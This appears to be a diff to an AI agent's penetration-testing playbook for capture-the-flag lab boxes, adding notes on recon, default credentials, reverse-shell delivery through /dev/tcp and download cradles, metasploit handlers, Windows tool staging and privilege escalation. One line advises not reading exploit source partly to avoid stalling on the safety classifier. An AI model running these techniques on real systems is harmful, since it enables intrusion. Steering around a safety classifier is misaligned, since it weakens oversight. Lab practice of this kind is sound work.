@@ -70,6 +70,10 @@ wpscan -u http://$T                              # if WordPress
 
 **Slow vs worker-starved, don't conflate them.** Fast HTTP 000 under concurrency (ffuf/sqlmap/parallel scans) = the box is WORKER-STARVED: back off to serial, one request per call, drop fuzzers, let it drain. A request that just never returns = the box is SLOW, not dead: raise the timeout to 120s+ and be patient (a heavy CMS/backend page can take 60-90s). Tell: nmap shows "filtered" but a single `nc`/`curl` connection succeeds = it drops fast-scan probes, switch to gentle serial mode rather than declaring it dead.
 
+**An all-filtered verdict from a NARROW probe is an artifact, not a firewall fact** - and a box's whole purpose can sit on one high port. Only the full sweep (`rustscan -g` / `nmap -p-`) is a verdict; re-run wide before writing a host off ([[wiki/cheatsheets/recon]]).
+
+**Dead-end tells, one probe each:** a DNS server refusing every query except `version.bind` is a stock forwarder (no zones, no intel, move on); loopback redis with `DBSIZE 0` has nothing ([[service-enumeration]]).
+
 **On any TLS host, dump the cert SANs early**; a hidden vhost that decoy services and ffuf/feroxbuster never surface can be listed only in the Subject Alternative Name, see [[cdn-waf-bypass]].
 
 **On any web surface, before moving to exploitation, all of this, in parallel where possible:**
@@ -84,6 +88,7 @@ Fingerprint the exact app + version. **`Skill(wiki-arsenal)` FIRST** on any fing
 
 ## Phase 2 Weaponize: pick the exploit
 
+- **Any fingerprinted admin panel / login: try vendor default pairs from [[default-credentials]] BEFORE brute force or CVE hunting.** A live default pair on a CMS/product admin panel is the instant foothold, and its authenticated features (theme editor, deploy console) are then yours.
 - **Version-known -> [[wiki/tools/searchsploit]] AND [[metasploit]] FIRST (the quick-win reflex).** The instant a service is fingerprinted to a version, run BOTH before hand-rolling or deep-diving a CVE: `searchsploit <app> <ver>` (local Exploit-DB; `-m <id>` to copy a PoC, `-x` to read it) and `msfconsole -qx "search <app>; exit"` (a ready `use`-able module = often an instant shell). A matching msf module or a copy-pasteable searchsploit PoC beats writing your own. Cross-check with the wiki CVE lookup ([[cve-arsenal]] · [[metasploit]]); prefer the documented/ready PoC over a fresh one. (GATE 1 still holds: the wiki item for the tech is `[x]` before a hand-rolled PoC - but a canned searchsploit/msf exploit for a known version IS the wiki-blessed tool, use it.) For the full search->`use`->`check`->`run` sequence and DB-backed recon, drive it through `Skill(metasploit)` rather than free-handing `msfconsole`.
 - **Treat a documented exploit tool as a BLACK BOX: use its interface, do not read its source.** For a known/public tool or PoC (e.g. `[[wp2shell]]`, a searchsploit/msf module, a vendor advisory PoC), drive it through its documented CLI as a trusted reference. Opening a tool's full source to study its mechanics wastes tokens and can stall the engagement on the safety classifier; keep your understanding at the WHAT-it-does / HOW-to-invoke level (its wiki page), not the source level. **When a step needs a PoC pulled from GitHub (or any external exploit fetched/run), pause for the OPERATOR's nudge** - the operator supplies the authorizing context at that point rather than the agent deriving the mechanics itself.
 - Pick the payload set from `wiki/payloads/` for the fingerprinted class (GATE 1: the wiki item is `[x]` before you hand-roll a PoC).
@@ -94,6 +99,7 @@ Fingerprint the exact app + version. **`Skill(wiki-arsenal)` FIRST** on any fing
 
 - **Diagnose target->attacker EGRESS before committing to a shell channel (recurring time-sink).** A connect-back that silently fails is usually a FILTERED egress port, not a broken payload - common C2 ports (4444/1337) are often blocked while 443/80/53/8000 pass. Test it FIRST with one clean single-command probe (a `curl`/`wget` to your listener port, or `bash -c 'echo x >/dev/tcp/<you>/<port>'`) across a couple of ports; if connect-back is filtered, DO NOT grind ports or a reverse shell - pivot to an HTTP-pull + one-shot-webshell/SSH channel (the box's "beacons OUT on a schedule" theme is a literal hint the network is egress-shaped). Deliver the shell payload **base64-wrapped or as a hosted script run via a download cradle**, NEVER a nested-quote `bash -i >& /dev/tcp/...` one-liner through the `vm.sh -> ssh -> --cmd` bridge (the quotes mangle and you cannot tell a dead port from a mangled payload - same delivery discipline as `vm-rsh.sh` for commands).
 - Deliver the staged payload/exploit against the target; prefer the documented PoC over a fresh one.
+- **Webshell-only channel on a Windows host: stage tools where they survive.** `C:\Windows\temp` is periodically cleaned (binaries vanish) and `certutil -urlcache` is intermittently silent on larger files; stage in a directory the compromised service writes to (e.g. the app server's own webapps tree) via `curl.exe`, hash-verify, and redirect privileged tool output into the served web path to read it back ([[windows-download-and-execute-methods]]).
 - **Stabilize EVERY Linux shell the moment it lands** (a raw `nc` shell has no job control, no arrow keys, no tab-complete, and Ctrl-C kills it). Full TTY-upgrade dance, in order: `python3 -c 'import pty;pty.spawn("/bin/bash")'` (fall back to `python`/`python2` if `python3` is absent; `script -qc /bin/bash /dev/null` if no python) -> `Ctrl+Z` to background -> `stty raw -echo; fg` (hands your terminal's raw mode to the shell; press Enter twice) -> `export TERM=xterm` (fixes clear/less/vim). Then set `stty rows <R> cols <C>` to your local `stty size` if editors wrap. Or better, drop your SSH key into a writable user's `~/.ssh/authorized_keys` for a resilient, already-interactive session. (Windows shells: no PTY dance; grab a proper shell via a C2/`ConPtyShell` or just RDP/WinRM once you have creds.)
 - **Catch every reverse-shell pop through `msfconsole` `multi/handler` - never a raw `nc` listener by default.** A raw `nc` PTY has the footgun that `Ctrl-C` kills the LISTENER (dropping the shell back to your own prompt - the false-RCE trap) and needs quoting gymnastics to drive. Default the payload to **meterpreter** (`linux/x64/meterpreter/reverse_tcp` etc.); when meterpreter is blocked or unstable - routine on **Windows/EDR**, where the stager dies but a plain shell survives - fall back to a **plain `shell_reverse_tcp`** payload still caught in `multi/handler` (a bare `nc`/`vm-scan.sh --win shell` listener is the last resort). Meterpreter also gives `autoroute`/`portfwd`/`socks` to reach internal-only ports - use that before hand-rolling SSH `-L` forwards. `msfconsole`/`msfvenom` are on the VM. (An already-interactive SSH/`evil-winrm`/cred session needs none of this - drive it directly.) Drive the whole handler setup + catch through `Skill(metasploit)`.
 - **Drive commands into the landed shell (reverse shell or tmux tab) with `scripts/vm-rsh.sh <eng> '<cmd>'`** - it base64-wraps the command so any metachars survive the vm.sh -> ssh -> tmux bridge and returns clean output. NEVER hand-quote `tmux send-keys` + `capture-pane`, or `/dev/tcp` file-transfers, to run commands; that quoting hell is a known repeat drift.
@@ -183,18 +189,20 @@ Then walk the manual checklist (do not skip any; the box's intended path is usua
 | Check | Command | Win = |
 |---|---|---|
 | sudo rights | `sudo -l` | NOPASSWD/GTFObin -> root |
-| SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | GTFObins |
+| SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | GTFObins; keep `-p` on the spawned shell or the euid silently drops ([[linux-privesc]]) |
 | Capabilities | `getcap -r / 2>/dev/null` | cap_setuid etc. |
 | Cron | `cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*` + pspy | writable/relative-path script |
 | **systemd timers** | `systemctl list-timers --all` + `systemctl cat <svc>` | **writable ExecStart script run as root** (e.g. THM Ollie `feedme.timer`) |
 | Writable root files | writable scripts/units root executes; `/etc/passwd` writable | inject payload, wait for trigger |
-| Groups | `id` (docker/lxd/disk/adm/shadow) | group->root GTFO |
+| Groups | `id` (docker/lxd/disk/adm/shadow) | group->root GTFO; a group named after ONE specific binary is the nudge, check that binary's bits first |
 | Creds | configs, history, DB, `.ssh`, backups | reuse / su |
 | Kernel/pkg CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check the patch level first ([[linux-privesc]]) |
 
+**Windows runs the same manual discipline off [[windows-privesc]] (winpeas + `whoami /priv` first).** Key shape the Linux table has no row for: a writable service-binary directory + a LocalSystem AUTO_START service you cannot start/stop = trigger execution with a REBOOT (SeShutdownPrivilege); a vendor repair watchdog can revert the swap, so re-arm and issue the reboot in the SAME action ([[wiki/cheatsheets/windows-privesc]]).
+
 Box-specific chains now live in wiki (see the technique pages linked per class on the hunt skills' Wiki maps).
 
-**Don't assume the flag path** (e.g. `/root/root.txt`); once you have exec, `find` it - the root flag can live at a non-standard path.
+**Don't assume the flag path** (e.g. `/root/root.txt`); once you have exec, `find` it - the root flag can live at a non-standard path, and the USER flag has TWO conventions (`/user.txt` at the filesystem root AND `/home/*/local.txt`): check both before declaring one absent.
 
 ## Capture (engagement discipline)
 
